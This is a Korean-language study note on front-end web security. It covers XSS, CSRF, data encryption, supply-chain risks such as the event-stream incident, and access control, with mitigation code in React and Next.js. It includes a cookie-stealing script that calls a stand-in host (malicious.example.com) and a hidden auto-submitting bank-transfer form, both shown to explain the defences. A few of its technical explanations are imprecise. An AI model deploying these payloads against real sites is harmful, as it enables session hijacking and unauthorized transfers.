# FrontEndSecurity

> author: @rud1676

- [1. 크로스 사이트 스크립팅 (XSS)](#xss크로스-사이트-스크립팅)
- [2. 크로스 사이트 리퀘스트 포저리 (CSRF)](#크로스-사이트-리퀘스트-포저리-csrf)
- [3. 데이터 저장 및 전송의 암호화](#데이터-저장-및-전송의-암호화)
- [4. 써드파티 라이브러리와 의존성](#써드파티-라이브러리-보안)
- [5. 접근 제어 및 사용자 인증](#접근-제어-및-사용자-인증)

---

## XSS(크로스 사이트 스크립팅)

> GPT: 크로스 사이트 스크립팅(XSS) 공격은 해커가 사용자의 웹 브라우저에서 악의적인 스크립트를 실행시켜 사용자 정보를 탈취하거나 조작하는 보안 취약점을 이용하는 공격입니다.

### MySpace 소셜네트워크 탈취사건

2005년도에 일어난 사건이다.

MySpace는 페이스북처럼 소셜네트워크인데, 로그인한 사용자가 소셜미디어의 나의 정보보기에서

내 정보를 수정하면서 -> 예를 들면 이름 입력하는 칸에 아래와 같은 스크립트를 주입한다.

```html
<script>
  var img = new Image();
  img.src = "http://malicious.example.com/?cookie=" + document.cookie;
</script>
```

이렇게 되면 A사용자의 프로필을 보는 사람들은 외부 주소로 나의 쿠키값이 외부주소로 불려나가진다.

즉, 이런상황을 상상하면 된다. 해커A유저가 나의 정보에 저렇게 스크립트를 주입했다면

B유저가 A유저가 쓴글에 관심이 생겨 이사람이 궁금해 A유저의 프로필 보기를 누르는 순간 B유저는 정보를 탈취당하게 된다.

### 어떻게 방지할까?

1. 사용자 입력 검증 및 살균 : 사용자의 입력을 검증하고 살균처리 하는 작업
2. 콘텐츠 보안 정책 : 스크립트 실행시 알려진 소스에서만 실행하도록 정책을 변경
3. 라이브러리 및 프레임워크 최신 상태 유지

사실 대부분의 현대적인 프레임워크와 라이브러리는 이미 XSS의 공격을 방지하는 수 많은 기법을 내장했다.

주로 사용하는 React나 Vue에서 조심해야할 행동은 아래와 같다.

```jsx
function TodoItem({ item }) {
  // 사용자 입력(item.text)을 그대로 렌더링
  return <div dangerouslySetInnerHTML={{ __html: item.text }}></div>;
}
```

이것과 같이 html자체로 택스트를 보는 코드가 있다면 이것은 1번의 과정을 면밀히 해야한다. 따라서 안전하게

```jsx
function TodoItem({ item }) {
  // JSX를 사용하여 안전하게 사용자 입력 렌더링
  return <div>{item.text}</div>;
}
```

리액트의 기본 사용방법을 지키며 코딩한다.

**콘텐츠 보안 정책 설정**

next에선 보통 next.config.js나 \_documente에서 meta태그를 통해 이루어진다.

```jsx
import Document, { Html, Head, Main, NextScript } from "next/document";

class MyDocument extends Document {
  render() {
    return (
      <Html>
        <Head>
          {/* CSP를 설정하는 meta 태그 */}
          <meta
            http-equiv="Content-Security-Policy"
            content="default-src 'self'; img-src https://example.com; script-src 'self' 'https://cdnjs.cloudflare.com';"
          />
        </Head>
        <body>
          <Main />
          <NextScript />
        </body>
      </Html>
    );
  }
}

export default MyDocument;
```

모든 리소스는 같은 출처에서만 (default-src), 이미지나 스크립트는 표시된 사이트에서도 허용할 수 있게 해놓은 설정입니다.

http-equiv는 https통신만 허용한다는 개념입니다

이런 식으로 어플리케이션의 보안정책을 설정 할 수 있습니다.

그러나 만능은 아니기에 의도대로 동작하는지 면밀하게 테스트하고 검증해야한다!

## 크로스 사이트 리퀘스트 포저리 (CSRF)

> GPT: 크로스 사이트 요청 위조(Cross-Site Request Forgery, CSRF)는 공격자가 사용자가 현재 인증된 세션을 이용하여, 사용자의 의도와는 무관하게 악의적인 변경 요청(예: 비밀번호 변경, 이메일 주소 변경 등)을 웹 애플리케이션에 전송하게 만드는 공격입니다. 사용자는 알지 못하는 사이에 공격자가 조작한 행위를 실행하게 됩니다.

### ING Direct 네덜란드 금융 탈취사건(2008)

온라인 뱅킹의 취약점을 이용해서 CSRF공격을 시도했다.

시나리오는 아래와 같다.

1. 해커는 온라인 뱅킹 세션을 이용해 무단으로 금융거래를 할 수 있는 사이트를 만들어 놨다.
2. 이메일이나 소셜미디어를 통해서 사용자에게 그 링크를 클릭을 유도 시켯다.
3. 사용자는 해당 사이트를 들어가자 마자 금융거래가 자동으로 이루어진다.

그렇다면 그 사이트라는 것은 무엇일까?

상황을 더욱 구체적으로 생각해보자. 사용자는 이미 금융거래를 하기 위해 로그인과 인증을 모두 마친 상태이다.(이때 서버는 유저에 대한 새션을 생성해놨을 것이다.)

그래서 그런 사용자가 아래와같은 사이트를 들어간다고 생각해보자.

```html
<html>
  <body>
    <form
      id="csrf-form"
      action="https://bank.example.com/transfer"
      method="POST"
      style="display: none;"
    >
      <input type="hidden" name="recipient_account" value="공격자계좌번호" />
      <input type="hidden" name="amount" value="1000" />
      <!-- 기타 필요한 폼 필드 -->
    </form>
    <script>
      document.getElementById("csrf-form").submit();
    </script>
  </body>
</html>
```

해당 페이지를 접속하면 자동으로 transfer => POST요청을 보낸다. 바로 송금이 된다.

클릭유도는 소셜 엔지니어링 기법(예: 피싱 이메일, 소셜 미디어 메시지)을 사용하여 사용자를 악성 웹 페이지로 유도한다.

### 어떻게 방지할 수 있나?

1. 토큰 사용: 폼이나 AJAX 요청에 CSRF 토큰을 포함시키고 서버에서 이를 검증하는 방법입니다. 토큰은 예측할 수 없어야 하며, 각 세션마다 고유해야 합니다.
2. SameSite 쿠키 속성 사용: 쿠키에 SameSite 속성을 설정하여, 쿠키가 같은 사이트의 요청에만 전송되도록 합니다. 이는 다른 도메인에서 온 요청에 대해 쿠키를 전송하지 않아 CSRF 공격을 방지합니다.
3. 사용자 인증 요구: 중요한 작업(예: 비밀번호 변경)에 대해 추가적인 사용자 인증(예: 비밀번호 재입력, 이메일 확인 등)을 요구합니다.
4. Referer 검증: HTTP 요청의 Referer 헤더를 검증하여 요청이 신뢰할 수 있는 페이지에서 발생했는지 확인합니다.

**토큰사용**

위의 예시를 시나리오로 생각하면 이렇다.

인증과정 다 마치고 송금화면에 들어갈 때, 클라이언트는 서버에 토큰 요청을 보내고 서버는 아래와 같은 요청을 처리한다.

```js
export default function handler(req, res) {
  const csrfToken = generateCsrfToken(); // CSRF 토큰 생성 함수, 구현 필요
  res.json({ csrfToken });
}
```

이때 토큰이랑 함께 세션의 정보등을 매칭시킨다.(뭐 아이피나 이런거 등?)

그리고 금액을 입력하고 송금을 버튼을 누르면 받아온 토큰과 함께 전송한다

```jsx
const TodoForm = ({ csrfToken }) => {
  return (
    <form method="POST" action="/api/add-todo">
      <input type="hidden" name="csrfToken" value={csrfToken} />
      {/* 나머지 폼 필드 */}
    </form>
  );
};
```

어떻게 보면 JWT토큰과 유사한 방식이다.

**SameSiteCookie**

서버에서 쿠키값을 보내줄때 아래와 같은 쿠키 정책과 함께 보내준다.

```js
res.setHeader(
  "Set-Cookie",
  `sessionToken=${token}; SameSite=Lax; HttpOnly; Path=/;`
);
```

이러한 정책은 쿠키가 HTTPS를 통한 요청에서만 전송되고, 사용자가 다른 사이트에서 현재 사이트로의 링크를 클릭하는 등의 GET 요청에서는 쿠키가 전송되지만, 폼 제출이나 AJAX 요청을 통한 타 사이트에서의 POST 요청에서는 쿠키가 전송되지 않도록 한다.

**사용자 인증을 추가적으로 요구**

비밀번호 다시입력 등 공격자가 아예 모르는 데이터를 요청 하게 해서 보안을 강화한다.

공격자는 세션유지를 이용해 공격하는 것이기 때문에 이러한 방지도 많은 범죄를 예방.

**Referrence 검증**

서버에서 믿을 수 있는 출처에서 요청을 보냇는지 검증하는것

```js
// pages/api/some-action.js

export default function handler(req, res) {
  const referer = req.headers.referer;
  if (!referer || !referer.startsWith("https://yourdomain.com")) {
    return res.status(403).json({ error: "Invalid referer" });
  }
  // 요청처리 후 반환
}
```

## 데이터 저장 및 전송의 암호화

### 보안 강화의 예시

1. HTTPS사용하기
2. 암호화된 스토리지 :브라우저에 데이터를 저장할 때는 localStorage, sessionStorage, 또는 쿠키에 직접적으로 민감한 정보를 저장하기보다는, 암호화된 형태로 저장해야한다. 예를 들어, Web Crypto API를 사용하여 데이터를 암호화한 후 저장.
3. 안전한 API 호출:JWT와 같은 인증토큰을 껴서 API호출을 해야한다.
4. 입력 데이터 검증 및 살균 : 입력데이터를 암호화해서 사용자에게 전송하기!

### 2013 - Adobe 데이터 유출 사건

2013년, Adobe에서 발생한 데이터 유출 사건이 있다. 이때 문제점이 두가지가 있었는데

1. 암호화된 비밀번호의 복호화 가능성
2. 비밀번호 힌트의 노출(비밀번호와 같은 디비에 넣어놓음)

공격자는 보안 취약점을 이용해 데이터베이스의 정보를 탈취했다.
비밀번호는 암호화 되어있어 알 수 없지만, 비밀번호 힌트를 통해 유추할 수 있게 되었다.

## 써드파티 라이브러리 보안

### 방지방법

1. 정기적인 업데이트와 패치 적용: 써드파티 라이브러리의 최신 버전을 유지하고, 보안 패치가 있을 때마다 적용합니다. 대부분의 보안 취약점은 발견되고 나서 빠르게 패치되므로, 정기적으로 업데이트하는 것이 중요합니다.
2. 취약점 데이터베이스 확인: NPM Audit, Snyk, OWASP Dependency-Check와 같은 도구를 사용하여 의존성의 취약점을 정기적으로 검사.
   이 도구들로 내 프로젝트를 지정하면 의존성과 가능하면 수정할 수 있는 명령어도 제시를 해준다.
3. 최소 권한 원칙 적용: 애플리케이션에서 필요한 기능만을 제공하는 라이브러리를 사용하고, 불필요한 기능이나 취약한 기능을 제거. => 개발시 npm으로 막 설치한걸 주기적으로 정리를 해줘야된다.
4. 보안 평가 및 코드 검토: 새로운 라이브러리를 도입하기 전에 보안 평가를 진행하고, 가능하다면 코드 검토를 통해 취약점을 사전에 파악.

### 실제 사례 event-stream(2018년도)

[출처](https://blog.ull.im/engineering/2018/11/30/event-stream-issue.html)

event-stream 은 스트림데이터를 쉽게 다루게 해주는 도구임. 파일 스트림데이터나 비디오스트림, 음성스트림 등 다양 한 스트림을 쉽게 다루게 해준다.
주간 다운로드가 2백만명에 육박하는 널리 알려진 패키지이다.

사건의 전말은 아래와 같다

1. right9ctrl이라는 사용자가 프로젝트 관리를 맡겠다고 원 제작자에게 요청, 그리고 수락됨
2. 9월 9일 flatmap-stream이라는 라이브러리를 사용하는 코드가 추가됨
3. 9월 16일 flatmap-stream을 없애고 직접 flatmap 구현 코드를 작성
4. 외부 라이브러리를 썼다가 성능등의 이슈로 자기가 직접 구현하는 것은 워낙 흔한 일이라서, 여기까지 아주 평범한 오픈 소스 프로젝트의 일상이었음

**사건의 시작**

1. flatmap-stream은 겉보기에는 이상할게 없는 라이브러리였지만, 단 1명의 기여자밖에 없었고 심지어 다운로드도 전혀 되지 않았음. minified된 파일에 의심스러운 코드가 포함되어 있음
2. unminified 해보니 ./test/data.js를 require 하고 있는데, AES256으로 암호화된 문자열 배열을 담고 있음. 이 암호화된 데이터를 푸는 key가 무엇이냐! 그것은 바로 의존성 최상위 패키지의 descrption이었음.
3. npm은 스크립트가 부모 패키지에서 구동될 때 npm_package_description이라는 환경 변수를 설정 (즉 환경변수가 암호화된 배열의 복호화를 위한 키값이 됨.) 즉, 이 의심스러운 코드는 flatmap-stream 패키지를 포함하는 모든 부모 패키지들을 대상으로 그 description을 이용해 암호화된 데이터의 복호화를 시도하고 있었음.

여기 까지 정리해서 조금더 상세히 설명하면. event-stream이 의존하는 패키지가 flatmap-stream인데, 이 패키지에 담겨진 test/data.js는 암호화 된 문자열을 담고 있더라.
그래서 이 암호화된 문자열을 푸는 키가 뭘까 봤더니 환경변수에서 상위 패키지의 description이였다. (npm은 자동으로 스크립트가 부모패키지에서 구동 될 때 description이라는 환경변수를 설정해준다.)

4. 대부분의 부모 패키지는 그 description이 올바른 AES256 키가 아니므로 오류가 날 것이므로, 단 하나만을 타겟으로 한 공격으로 유추됨 event-stream과 의존성이 있는 모든 패키지들을 전수조사 해본 결과 copay-dash라는 비트코인 wallet 패키지가 그 대상이었다는 것이 밝혀짐
   이 패키지의 description은 “A Secure Bitcoin Wallet”이었고, 이걸 키로 암호를 풀자 test/data.js 내용이 복호화되었고, 그것은 다름 아닌 소스 코드였음
   이 코드는 Copay의 프로세스에 스크립트를 injection시켜서 비트코인을 가로채고 있었음

마무리 까지 정리하면

그렇다면 event-stream -> 어떤 패키지 -> flatmap-stream 의 구조로 가는 어떤 패키지를 모두 조사해서 description을 뒤져봐야했다.

그런데 틀린 description키값이 들어오면 오류가 날 것이므로. 하나를 타겟으로 한 공격이라는 것을 커뮤니티에서 유추했다. 그래서 모든 것을 조사했더니

copay-dash라는 비트코인 wallet패키지가 그 대상이였고. 이 description으로 암호를 풀자 test/data.js내용이 복호화 되고 그것은 소스코드였다.

그것은 스크립트를 injection해서 비트코인을 가로채는 코드였음!!!

요약하면

- 이 신박한 범죄자는 널리 쓰이는 오픈소스 프로젝트의 관리자로 잠입, 일주일간 비트코인을 훔치는 코드를 배포
- 일주일 후 패키지를 제거했지만, 이미 배포된 버전을 사용하는 소프트웨어들은 비트코인을 실어나르고 있었음
- 특정한 상황, 일주일동안 배포된 버전의 event-stream이 포함된 copay-dash 패키지를 이용하는 소프트웨어를 사용한 유저만 공격당하고 있었겠지만, npm의 복잡한 의존성과 취약점이 전 세계적으로 공개된 사건.
- 아울러 오픈소스 프로젝트의 신원이 불확실한 기여자가 이렇게 큰 충격을 만들어 낼 수 있다는 점에 주목하며 여러 논쟁거리를 생산하는 중.

## 접근 제어 및 사용자 인증

1. 안전한 매커니즘으로 구현합니다.

- 토큰 기반 인증 사용: 예를 들어, JWT사용해 안전하게 관리. 사용자가 로그인하면 서버는 JWT를 발행하고, 클라이언트는 이후의 요청에 이 토큰을 첨부하여 사용자 인증을 수행.
  => JWT토큰 발행도 방식이 여러가지가 있다. JWT토큰을 어떻게 관리하냐는 JWT토큰 정책이 무엇이냐 인데, 현대에서는 리프래시 토큰을 또 사용해 관리합니다.

- OAuth, OpenID Connect: 소셜 로그인 같은 외부 인증 제공자를 사용할 때는 OAuth나 OpenID Connect 같은 표준 프로토콜을 활용. 이는 사용자 인증 정보를 안전하게 처리하며, 개발자가 보안에 대해 신경 쓸 부분을 줄여줍니다. => 이것 또한 프론트엔드 개발에서 혁명이다.

2.  접근 제어 로직 구현

- 클라이언트 사이드 접근 제어: 애플리케이션 내에서 사용자의 역할이나 권한에 따라 접근할 수 있는 페이지나 기능을 제한. 예를 들어, 특정 페이지 접근 시 사용자의 권한을 검사하여, 권한이 없는 사용자는 접근할 수 없도록 리다이렉트한다.

- 동적 UI: 권한이 없는건 보여주지 않는다.

## 결론

OWASP Top 10 <= 해당키워드를 기억하자. 어떤 접근법으로 보안을 다루는지 계속 생각해야한다. 우리의 취준생 입장에서는 개발하기 급급하긴 하지만,
알고 모르고의 차이는 우리가 앞으로 공부하고, 공부한 것을 바탕으로 서비스를 개발 방향에 대해서 막대한 영향이 생길 것이다.
